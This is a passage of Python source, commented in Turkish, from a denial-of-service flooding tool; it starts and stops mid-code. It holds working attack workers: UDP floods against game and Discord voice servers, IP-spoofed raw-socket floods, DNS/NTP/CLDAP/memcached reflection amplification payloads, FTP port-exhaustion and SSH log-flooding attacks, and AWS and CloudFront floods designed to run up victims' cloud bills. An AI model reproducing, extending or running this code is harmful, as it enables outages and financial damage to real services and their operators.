        close(s)

def w_CPS(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(0.9); s.connect((ip,port))
        SENT[0]+=1; close(s)

def w_CONNECTION(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(0.9); s.connect((ip,port)); SENT[0]+=1
        while not _stop.is_set():
            if not s.recv(1): break
        close(s)

def w_VSE(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_TS3(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_MCPE(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_FIVEM(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    pl=b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, pl, (ip,port))
        close(s)

def w_DISCORD(host, port, *_):
    """Discord Voice/RTP — root varsa spoofed raw UDP, yoksa normal UDP fallback"""
    try: ip=socket.gethostbyname(host)
    except: ip=host
    # Discord RTP/RTCP payloadları
    def mk_pl():
        return random.choice([
            b'\x80\x78' + struct.pack('!H',rint(0,65535)) + os.urandom(4) + os.urandom(4) + os.urandom(rint(8,512)),
            b'\x13\x37\xca\xfe\x01\x00\x00\x00\x13\x37\xca\xfe\x01\x00\x00\x00' + os.urandom(rint(4,512)),
            b'\x00\x01\x00\x70' + b'\x21\x12\xa4\x42' + os.urandom(108),  # STUN
            b'\x80\x63' + struct.pack('!H',rint(0,65535)) + os.urandom(rint(32,512)),  # RTCP
            os.urandom(rint(512,1024)),
        ])
    # root varsa: IP spoof ile raw
    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if has_root:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not _stop.is_set():
                pkt=mk_discord(rip(), ip, port)
                sndto(s, pkt, (ip,port))
            close(s); return
        except: pass
    # root yok: normal UDP (hızlı, çalışır, IP spoof yok)
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set():
            sndto(s, mk_pl(), (ip,port))
        close(s)

# ── MEGA_UDP ──────────────────────────────────────────────────────────────────

# DNS qtype havuzu — ANY en yıkıcı (resolver tüm kayıt tiplerini arar)
_DNS_QTYPES = [0x00FF, 0x0001, 0x001C, 0x000F, 0x0002, 0x0006]  # ANY A AAAA MX NS SOA

def _mk_dns_query(domain_str):
    """
    Gerçek DNS sorgu paketi + EDNS0 OPT.

    Random transaction ID + random subdomain → her paket benzersiz → cache miss garantili.
    EDNS0 UDP payload = 4096 → resolver büyük yanıt üretmeye çalışır → daha fazla CPU/IO.
    qtype=ANY → resolver tüm kayıt tiplerini arar → recursive lookup zinciri.
    """
    sub   = rstr(rint(4, 12))
    parts = f"{sub}.{domain_str}".split('.')
    qname = b''.join(bytes([min(len(lbl), 63)]) + lbl.encode('ascii', 'replace')[:63]
                     for lbl in parts if lbl) + b'\x00'
    return (
        os.urandom(2)                               # transaction ID (random)
        + b'\x01\x00'                               # flags: recursion desired
        + b'\x00\x01'                               # QDCOUNT = 1
        + b'\x00\x00\x00\x00'                       # ANCOUNT=0, NSCOUNT=0
        + b'\x00\x01'                               # ARCOUNT = 1 (EDNS0 OPT kaydı)
        + qname
        + struct.pack('!HH', random.choice(_DNS_QTYPES), 0x0001)  # qtype, IN
        # EDNS0 OPT record — RFC 6891
        + b'\x00'                                   # root label
        + b'\x00\x29'                               # type = OPT (41)
        + b'\x10\x00'                               # class = 4096 (max UDP payload)
        + b'\x00\x00\x00\x00'                       # TTL = 0
        + b'\x00\x00'                               # rdlength = 0
    )

_SSH_BANNERS = [
    b'SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.3\r\n',
    b'SSH-2.0-OpenSSH_8.9p1 Debian-3~bpo11+1\r\n',
    b'SSH-2.0-OpenSSH_7.9p1 Raspbian-10+deb10u4\r\n',
    b'SSH-2.0-PuTTY_Release_0.80\r\n',
    b'SSH-2.0-libssh_0.10.6\r\n',
]

def _mk_ssh_udp():
    """
    SSH protokol benzeri UDP payload.

    3 mod rastgele seçilir:
    0 — SSH banner + artık payload → basit bant genişliği tüketimi
    1 — SSH2_MSG_KEXINIT (0x14) simülasyonu → IDS/IPS SSH kex parsing overhead
    2 — Ham büyük UDP → NIC interrupt flooding, farklı boyutlar (64–1400 B)
    """
    size = random.choice([64, 128, 256, 512, 900, 1400])
    m    = rint(0, 2)
    if m == 0:
        b = random.choice(_SSH_BANNERS)
        return b + os.urandom(max(0, size - len(b)))
    if m == 1:
        return (
            struct.pack('!IB', size, rint(4, 16))    # packet_length, padding_length
            + b'\x14'                                 # SSH2_MSG_KEXINIT
            + os.urandom(16)                          # cookie
            + struct.pack('!I', rint(20, 200))        # kex_algorithms namelist length
            + os.urandom(size)                        # random kex data
        )
    return os.urandom(size)

def w_MEGA_UDP(host, port, *_):
    """
    MEGA_UDP — Port 53 (DNS) + Port 22 (SSH) çift vektör akıllı UDP flood.

    Vektör 1 — DNS flood (port 53), varsayılan %70:
      • Gerçek DNS sorgu formatı: random TxID + random subdomain + EDNS0 OPT
      • qtype=ANY/A/AAAA/MX/NS/SOA random rotation → cache miss + recursive lookup
      • UDP payload size = 4096 (EDNS0) → resolver max response size zorlaması
      → Sunucu CPU + bellek + disk (zone transfer) maksimum yüklenir

    Vektör 2 — SSH-like UDP flood (port 22), varsayılan %30:
      • SSH-2.0 banner + SSH2_MSG_KEXINIT yapısı → IDS/firewall SSH decode yükü
      • 64–1400 byte arası paket boyutu → NIC interrupt yoğunlaştırma
      → Bant genişliği tüketimi + firewall/IPS state table baskısı

    Adaptif split: port=53 → %100 DNS  |  port=22 → %100 SSH  |  diğer → 70/30
    Kaynak port rotasyonu (her 2000 paket): OS'un yeni ephemeral port ataması → sanki
      farklı kaynaklardan geliyor gibi görünür (firewall tuple tablosunu zorlar)
    Root varsa: IP spoof ile raw UDP → kaynak IP sahteciliği + amplifikasyon etkisi
    """
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host

    domain = host if '.' in host else f"{host}.target"

    # Port'a göre adaptif split oranı
    if port == 53:
        dns_ratio = 10   # %100 DNS
    elif port == 22:
        dns_ratio = 0    # %100 SSH
    else:
        dns_ratio = 7    # %70 DNS / %30 SSH

    has_root = (os.name != 'nt' and os.geteuid() == 0)

    # ── Pool ön üretimi — hot loop'ta sıfır paket oluşturma maliyeti ──────────
    # DNS: 2000 farklı subdomain + qtype kombinasyonu → cache miss çeşitliliği korunur.
    # TxID (ilk 2 byte) her göndermede os.urandom(2) ile değiştirilir → tek syscall.
    # SSH: 500 pre-built payload → cycle() ile dönülür, üretim yok.
    _DNS_N   = 2000
    _SSH_N   = 500
    dns_pool = [bytearray(_mk_dns_query(domain)) for _ in range(_DNS_N)]
    ssh_pool = [_mk_ssh_udp()                    for _ in range(_SSH_N)]

    if has_root:
        # Root: raw UDP → IP spoof ile kaynak gizleme
        with suppress(Exception):
            sr = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sr.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            i = 0
            while not _stop.is_set():
                i += 1
                if i % 10 < dns_ratio:
                    buf = dns_pool[i % _DNS_N]
                    buf[0:2] = os.urandom(2)          # TxID rotasyonu
                    pld, dport = bytes(buf), 53
                else:
                    pld, dport = ssh_pool[i % _SSH_N], 22
                sndto(sr, mk_amp(rip(), ip, dport, pld), (ip, dport))
            close(sr)
            return

    # Root yok: normal SOCK_DGRAM — pool ile yüksek PPS
    with suppress(Exception):
        s53 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s22 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        i   = 0
        while not _stop.is_set():
            i += 1
            if i % 10 < dns_ratio:
                buf = dns_pool[i % _DNS_N]
                buf[0:2] = os.urandom(2)              # TxID rotasyonu — tek syscall
                sndto(s53, bytes(buf), (ip, 53))
            else:
                sndto(s22, ssh_pool[i % _SSH_N], (ip, 22))
            # Kaynak port rotasyonu: her 3000 pakette yeni ephemeral port
            if i % 3000 == 0:
                with suppress(Exception): s53.close(); s22.close()
                s53 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s22 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        close(s53); close(s22)

# ── AMP reflection ─────────────────────────────────────────────────────────────
AMP_PAYLOADS = {
    'RDP':   (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389),
    'CLDAP': (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01'
              b'\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c'
              b'\x61\x73\x73\x30\x00', 389),
    'MEM':   (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211),
    'CHAR':  (b'\x01', 19),
    'ARD':   (b'\x00\x14\x00\x00', 3283),
    'NTP':   (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123),
    'DNS':   (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00'
              b'\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53),
}

def w_AMP(target_ip, amp_payload, amp_port, refs):
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        pool=cycle(refs)
        while not _stop.is_set():
            ref=next(pool)
            sndto(s, mk_amp(target_ip, ref, amp_port, amp_payload), (ref,amp_port))
        close(s)


# ── FTP_KILLER ────────────────────────────────────────────────────────────────
def w_FTP_KILLER(host, port, *_):
    """
    FTP sunucu çok-vektör exhaustion flood. Hedef: ip:21

    FTP'nin zayıf noktası: kontrol kanalı + ayrı veri kanalı = çift kaynak tüketimi.

    Teknik 1 — PASV port tükenmesi (40%):
      Login → ardı ardına PASV komutları gönder → sunucu her birinde
      yeni ephemeral port açar ve veri bağlantısı bekler.
      Bağlanmadan bırak → sunucu port tablosunu doldurur (~28K port),
      yeni oturumlar için port kalmaz. En etkili teknik.

    Teknik 2 — NOOP/komut seli (30%):
      Login → NOOP × N, TYPE A/I toggle, SYST, FEAT, PWD döngüsü →
      kontrol kanalı state machine yükü, her komut log yazımı + CPU.
      Sunucu bağlantıyı tuttuğu sürece devam eder (30+ dakika oturum limiti).

    Teknik 3 — Rapid auth flood (20%):
      5 paralel bağlantı, rastgele USER/PASS → auth handler (PAM/DB lookup)
      yükü, fail2ban tetikleme, /var/log/vsftpd.log veya /var/log/proftpd.log yazımı.
      530 yanıtı bile işleme maliyeti taşır.

    Teknik 4 — RETR+ABOR zinciri (10%):
      Login → PASV → RETR rastgele dosya → hemen ABOR → sunucu
      dosya handle açar/kapatır, buffer tahsis/serbest bırakır →
      heap thrash + FD cycle yükü. ProFTPD ve vsftpd en çok bu teknike duyarlı.
    """

    def _recv_line(s, to=3):
        buf = b''; dl = time.time() + to
        while time.time() < dl:
            try:
                c = s.recv(1)
                if not c: break
                buf += c
                if buf.endswith(b'\n'): return buf.decode('utf-8', errors='ignore').strip()
            except: break
        return buf.decode('utf-8', errors='ignore').strip()

    def _recv_code(s, to=3):
        r = _recv_line(s, to)
        # Multi-line: "220-...\r\n220 Ready" → son satır
        while r and len(r) >= 4 and r[3] == '-':
            r = _recv_line(s, to)
        try: return int(r[:3]) if r else 0
        except: return 0

    def _cmd(s, command):
        try: s.sendall((command + '\r\n').encode()); return True
        except: return False

    def _parse_pasv(resp):
        try:
            nums = resp.split('(')[1].rstrip(')').split(',')
            return '.'.join(nums[:4]), int(nums[4]) * 256 + int(nums[5])
        except: return None, None

    def _login(s, user='anonymous', pw='guest@example.com'):
        code = _recv_code(s)       # 220 banner
        if code not in (220, 230): return False
        _cmd(s, f'USER {user}')
        code = _recv_code(s)
        if code == 331:
            _cmd(s, f'PASS {pw}')
            code = _recv_code(s)
        return code == 230

    try:    ip = socket.gethostbyname(host)
    except: ip = host
    tport = int(port) if port else 21

    while not _stop.is_set():
        with suppress(Exception):
            role = rint(0, 9)

            if role < 4:  # PASV port tükenmesi — en etkili
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(5)
                try:
                    s.connect((ip, tport))
                    if _login(s):
                        # Her PASV komutu sunucuda yeni bir listener port açar
                        # Bağlanmadan bırakırsak sunucu o portu pasif beklemede tutar
                        for _ in range(20):
                            if _stop.is_set(): break
                            _cmd(s, 'PASV')
                            _recv_line(s, 2)   # 227 yanıtı oku (port bilgisi)
                            SENT[0] += 1
                        time.sleep(3)  # sunucu portları tutarken bekle
                    else:
                        SENT[0] += 1
                finally: close(s)

            elif role < 7:  # NOOP + komut seli — oturum açık tut, CPU yükü
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(4)
                try:
                    s.connect((ip, tport))
                    if _login(s):
                        cmds = cycle(['NOOP','SYST','FEAT','PWD','TYPE A','TYPE I',
                                      'STAT','NOOP','NOOP','NOOP'])
                        for _ in range(30):
                            if _stop.is_set(): break
                            _cmd(s, next(cmds))
                            _recv_code(s, 1)
                            SENT[0] += 1
                finally: close(s)

            elif role < 9:  # Rapid auth flood — auth handler yükü
                for _ in range(5):
                    if _stop.is_set(): break
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.settimeout(3)
                    try:
                        s.connect((ip, tport))
                        _recv_code(s)
                        _cmd(s, f'USER {rstr(rint(4,12))}')
                        _recv_code(s)
                        _cmd(s, f'PASS {rstr(rint(8,16))}')
                        _recv_code(s)
                        SENT[0] += 1
                    finally: close(s)

            else:  # RETR + ABOR zinciri — file handle + buffer cycle
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(4)
                try:
                    s.connect((ip, tport))
                    if _login(s):
                        _cmd(s, 'TYPE I'); _recv_code(s)
                        for _ in range(10):
                            if _stop.is_set(): break
                            _cmd(s, 'PASV')
                            _recv_line(s, 2)
                            # RETR başlat — sunucu data kanalı açar, dosya göndermeye başlar
                            _cmd(s, f'RETR /{rstr(8)}.dat')
                            _recv_code(s, 1)  # 150
                            # Hemen iptal et — sunucu transfer'ı keser, temizler
                            _cmd(s, 'ABOR')
                            _recv_code(s, 1)  # 226 / 426
                            SENT[0] += 1
                finally: close(s)


# ── SSHLOG_FLOOD ──────────────────────────────────────────────────────────────
def w_SSHLOG_FLOOD(host, port, *_):
    """
    SSH sunucu log dosyasını doldur (/var/log/auth.log, /var/log/secure).
    Hedef: ip:22

    Zeka: KEXINIT paketinde 20 tane rastgele 28-char algoritma ismi gönderilir.
    OpenSSH hepsini log satırına yazar → "Their offer: bad-alg-xxx...(500+ char)"
    Her bağlantı ~3-4 KB log yazar. Dedup yok çünkü her isim benzersiz.

    Teknik 1 — Devasa KEXINIT (50%):
      Banner + SSH_MSG_KEXINIT (type 20) ile tamamen sahte, çok uzun algoritma
      isimleri → "Unable to negotiate: no matching cipher. Their offer: [500 char]"
      Her deneme ≈ 3-4 KB log satırı.

    Teknik 2 — Hızlı banner flood (30%):
      10 rapid TCP bağlantısı → banner gönder → kapat.
      "Disconnected from authenticating user X [preauth]" × 10.

    Teknik 3 — Garbage packet (20%):
      Banner exchange + random bayt → "Bad packet length XXXXXXXX" log.
    """
    def _nl(names):
        b = ','.join(names).encode()
        return struct.pack('>I', len(b)) + b

    def _pkt(msg_type, payload=b''):
        body = bytes([msg_type]) + payload
        pad  = 8 - ((1 + len(body)) % 8)
        if pad < 4: pad += 8
        frame = bytes([pad]) + body + os.urandom(pad)
        return struct.pack('>I', len(frame)) + frame

    def _huge_kexinit():
        # 20 × 28-char isim → ~580 char per namelist; OpenSSH tüm listeyi loglar
        big = lambda: [f'bad-alg-{rstr(16)}-no{i:03d}' for i in range(20)]
        p  = os.urandom(16)          # cookie
        p += _nl(big())              # kex_algorithms       (log'a gider)
        p += _nl(big())              # server_host_key_algs (log'a gider)
        p += _nl(big())              # enc_c2s
        p += _nl(big())              # enc_s2c
        p += _nl(big())              # mac_c2s
        p += _nl(big())              # mac_s2c
        p += _nl(['none'])           # comp_c2s
        p += _nl(['none'])           # comp_s2c
        p += _nl([])                 # lang_c2s
        p += _nl([])                 # lang_s2c
        p += b'\x00' + b'\x00' * 4  # first_kex_follows + reserved
        return _pkt(20, p)

    banner = b'SSH-2.0-OpenSSH_9.3p2 Ubuntu-1ubuntu3.6\r\n'

    try:    ip = socket.gethostbyname(host)
    except: ip = host
    tport = int(port) if port else 22

    while not _stop.is_set():
        with suppress(Exception):
            role = rint(0, 9)

            if role < 5:  # Devasa KEXINIT — max log boyutu per connection
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(4)
                try:
                    s.connect((ip, tport))
                    s.recv(256)               # server banner
                    s.sendall(banner)
                    s.sendall(_huge_kexinit())
                    SENT[0] += 1
                    time.sleep(0.05)          # sunucu logu flush etsin
                finally: close(s)

            elif role < 8:  # Rapid banner flood — çok sayıda preauth kaydı
                for _ in range(10):
                    if _stop.is_set(): break
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.settimeout(2)
                    try:
                        s.connect((ip, tport))
                        s.recv(256)
                        s.sendall(banner)
                        SENT[0] += 1
                    finally: close(s)

            else:  # Garbage packet — "Bad packet length" log
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(3)
                try:
                    s.connect((ip, tport))
                    s.recv(256)
                    s.sendall(banner)
                    # packet_length alanı olarak çok büyük değer → "Bad packet length"
                    s.sendall(struct.pack('>I', rint(0xFFFF00, 0xFFFFFF)) + os.urandom(64))
                    SENT[0] += 1
                finally: close(s)


# ── AWS_KILLER ────────────────────────────────────────────────────────────────
def w_AWS_KILLER(t, rpc):
    """
    AWS infrastrüktürü çok-vektör L7 flood.
    Hedef: API Gateway URL (xxxx.execute-api.us-east-1.amazonaws.com)
           veya S3 bucket URL (bucket.s3.amazonaws.com)

    Teknik 1 — API Gateway + Lambda cold start (35%):
      Her istek farklı path + X-Amzn-Trace-Id → Lambda container tahsisi,
      CloudWatch log yazımı, X-Ray trace billing.

    Teknik 2 — S3 key enumeration billing (25%):
      Rastgele object key GET → 403/404 per request; AWS GET isteği başına faturalandırır.
      Fake AWS4-HMAC-SHA256 imzası → IAM doğrulama yükü.

    Teknik 3 — ELB/ALB connection pool tüketimi (25%):
      5 eşzamanlı half-open bağlantı → ALB worker thread/slot tüketimi.

    Teknik 4 — Lambda Event + DynamoDB stream inject (15%):
      POST body DynamoDB stream record formatında → Lambda event parse yükü
      + CloudWatch Logs yazımı + X-Ray sampled=1 billing.
    """
    _REGIONS  = ['us-east-1','us-west-2','eu-west-1','ap-southeast-1','ap-northeast-1']
    _API_PFXS = ['/prod/','/v1/','/v2/','/api/','/live/','/staging/','/dev/','/graphql']
    _S3_EXTS  = ['jpg','png','json','xml','csv','txt','pdf','mp4','zip','gz']

    while not _stop.is_set():
        with suppress(Exception):
            role = rint(0, 9)

            if role < 4:  # Lambda cold start exhaustion
                s = t.conn(5)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    path   = random.choice(_API_PFXS) + rstr(rint(4,12))
                    region = random.choice(_REGIONS)
                    req_id = f'{rstr(8)}-{rstr(4)}-{rstr(4)}-{rstr(4)}-{rstr(12)}'
                    body   = (f'{{"id":"{rstr(16)}","ts":{int(time.time())},'
                              f'"nonce":"{rstr(24)}","data":"{rstr(48)}"}}')
                    req = (f"POST {path} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"Content-Type: application/json\r\n"
                           f"Content-Length: {len(body)}\r\n"
                           f"X-Amzn-Trace-Id: Root=1-{rstr(8)}-{rstr(24)}\r\n"
                           f"X-Request-Id: {req_id}\r\n"
                           f"X-Forwarded-For: {rip()}\r\n"
                           f"User-Agent: aws-sdk-python/1.{rint(20,35)}.0 Python/3.{rint(8,12)}.0 {region}\r\n"
                           f"Connection: keep-alive\r\n\r\n{body}").encode()
                    if not send(s, req): break
                close(s)

            elif role < 7:  # S3 key billing flood
                s = t.conn(5)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    key = '/'.join(rstr(rint(4,12)) for _ in range(rint(1,4)))
                    key += '.' + random.choice(_S3_EXTS)
                    dt  = time.strftime('%Y%m%dT%H%M%SZ')
                    req = (f"GET /{key} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"User-Agent: aws-cli/2.{rint(10,20)}.0\r\n"
                           f"X-Amz-Date: {dt}\r\n"
                           f"X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\r\n"
                           f"Authorization: AWS4-HMAC-SHA256 Credential={rstr(20)}/{time.strftime('%Y%m%d')}/us-east-1/s3/aws4_request,"
                           f"SignedHeaders=host;x-amz-date,Signature={rstr(64)}\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break
                close(s)

            elif role < 9:  # ELB half-open pool exhaustion
                socks = []
                for _ in range(5):
                    if _stop.is_set(): break
                    try:
                        ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        ns.settimeout(rpc * 0.2 + 1)
                        ns.connect((t.ip, t.port))
                        socks.append(ns); SENT[0] += 1
                    except: pass
                time.sleep(max(1, rpc * 0.2))
                for ns in socks: close(ns)

            else:  # Lambda DynamoDB stream event + X-Ray billing
                s = t.conn(5)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    body = (f'{{"Records":[{{"eventID":"{rstr(32)}",'
                            f'"eventName":"INSERT","dynamodb":{{"Keys":{{"id":{{"S":"{rstr(16)}"}}}}}}}}]}}')
                    req = (f"POST {t.path} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"Content-Type: application/json\r\n"
                           f"Content-Length: {len(body)}\r\n"
                           f"X-Amzn-Trace-Id: Root=1-{rstr(8)}-{rstr(24)};Sampled=1\r\n"
                           f"X-Amz-Invocation-Type: RequestResponse\r\n"
                           f"X-Amz-Log-Type: Tail\r\n"
                           f"User-Agent: {rua()}\r\n"
                           f"Connection: keep-alive\r\n\r\n{body}").encode()
                    if not send(s, req): break
                close(s)


# ── CLOUDFRONT_KILLER ─────────────────────────────────────────────────────────
def w_CLOUDFRONT_KILLER(t, rpc):
    """
    AWS CloudFront CDN çok-vektör L7 flood.
    Hedef: distribution.cloudfront.net veya CloudFront arkasındaki domain.

    Teknik 1 — Cache miss: unique query bust (30%):
      v={12char}&t={ms_timestamp}&r={8char} → CDN cache key tamamen farklı →
      her istek origin'e forward; CloudFront + origin bant/CPU baskısı.

    Teknik 2 — Range request amplification (25%):
      Range: bytes=X-Y + If-Range: fake-etag → CF partial content cachelemez,
      origin'e gönderir; 1 byte talep → origin tam dosyayı serve eder.

    Teknik 3 — Lambda@Edge cold start (25%):
      image/format + quality + width paramları ile birlikte CF viewer request
      Lambda@Edge'i tetikler → her eşsiz param seti → soğuk start + billing.

    Teknik 4 — Origin shield revalidation (20%):
      Cache-Control: no-cache + If-None-Match: fake-etag → CF origin shield'dan
      geçerek origin'e conditional GET; 304 bile olsa origin bağlantısı kurar.
    """
    _FORMATS = ['webp','jpg','png','avif','gif','svg','mp4','webm','heic']
    _CF_VIEWER_HDRS = [
        'CloudFront-Is-Desktop-Viewer: true',
        'CloudFront-Is-Mobile-Viewer: false',
        'CloudFront-Viewer-Country: US',
        f'CloudFront-Viewer-ASN: {rint(1000,99999)}',
    ]

    while not _stop.is_set():
        with suppress(Exception):
            s    = t.conn(5)
            role = rint(0, 9)

            if role < 3:  # Cache miss: unique query bust
                for _ in range(rpc):
                    if _stop.is_set(): break
                    qs  = f"v={rstr(12)}&t={int(time.time()*1000)}&r={rstr(8)}&nonce={rstr(6)}"
                    req = (f"GET {t.path}?{qs} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"User-Agent: {rua()}\r\n"
                           f"Accept: text/html,*/*;q=0.9\r\n"
                           f"Cache-Control: no-cache, no-store\r\n"
                           f"Pragma: no-cache\r\n"
                           f"X-Forwarded-For: {rip()}\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            elif role < 6:  # Range amplification
                for _ in range(rpc):
                    if _stop.is_set(): break
                    start = rint(0, 999999)
                    req = (f"GET {t.path} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"User-Agent: {rua()}\r\n"
                           f"Range: bytes={start}-{start + rint(1,512)}\r\n"
                           f"If-Range: \"{rstr(32)}\"\r\n"
                           f"Accept: */*\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            elif role < 9:  # Lambda@Edge cold start
                for _ in range(rpc):
                    if _stop.is_set(): break
                    fmt    = random.choice(_FORMATS)
                    cf_hdr = '\r\n'.join(_CF_VIEWER_HDRS)
                    req = (f"GET {t.path}?format={fmt}&quality={rint(1,100)}&w={rint(100,4000)}&h={rint(100,3000)} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"User-Agent: {rua()}\r\n"
                           f"Accept: image/{fmt},*/*\r\n"
                           f"{cf_hdr}\r\n"
                           f"X-Forwarded-For: {rip()}\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            else:  # Origin shield revalidation burst
                for _ in range(rpc):
                    if _stop.is_set(): break
                    age = time.strftime('%a, %d %b %Y %H:%M:%S GMT',
                                        time.gmtime(time.time() - rint(0, 3600)))
                    req = (f"GET {t.path} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"User-Agent: {rua()}\r\n"
                           f"Cache-Control: no-cache, max-age=0, must-revalidate\r\n"
                           f"Pragma: no-cache\r\n"
                           f"If-None-Match: \"{rstr(32)}\"\r\n"
                           f"If-Modified-Since: {age}\r\n"
                           f"X-Forwarded-For: {rip()}\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            close(s)


# ── RPS_GOD_LEVEL ─────────────────────────────────────────────────────────────
_RPS_PEAK = [0]  # thread'ler arası peak RPS izleme

def w_RPS_GOD_LEVEL(t, rpc):
    """
    Saniyede olabildiğince fazla request. Tek hedef: ham hız.

    Strateji:
    1. Pre-built batch: tek sendall() çağrısıyla 64KB = ~1000 request → syscall overhead sıfır
    2. Persistent connection: TLS handshake yok, TCP kurulum yok
    3. Thread başına 1 SSL context: connection başına değil (OpenSSL init overhead ortadan)
    4. SO_SNDBUF 512KB: kernel gönderme tamponu büyük → TCP stall yok
    5. TCP_NODELAY: Nagle tamponu bypass → paket hemen gönderilir
    6. TCP_QUICKACK: ACK gecikmesi kaldırılır (Linux)
    7. Non-blocking drain: her N batch'te bir recv() → TCP backpressure kırılır
    8. sendmsg() scatter-gather: Python string concatenation overhead yok (stdlib)
    """
    # Thread başına bir kez oluşturulur
    _ctx = None
    if t.tls:
        _ctx = ssl.create_default_context()
        _ctx.check_hostname = False
        _ctx.verify_mode    = ssl.CERT_NONE
        with suppress(Exception):
            _ctx.set_ciphers('AES128-GCM-SHA256:AES256-GCM-SHA384')

    # En küçük geçerli HTTP/1.1 isteği (tek seferlik inşa)
    req = (f"GET {t.path} HTTP/1.1\r\n"
           f"Host: {t.host}\r\n"
           f"Connection: keep-alive\r\n"
           f"Accept: */*\r\n\r\n").encode()

    # 64KB batch (1 TCP max-size segment ≈ MSS*44)
    batch_n = max(1, 65536 // len(req))
    batch   = req * batch_n          # Python bytes: single allocation, no loop
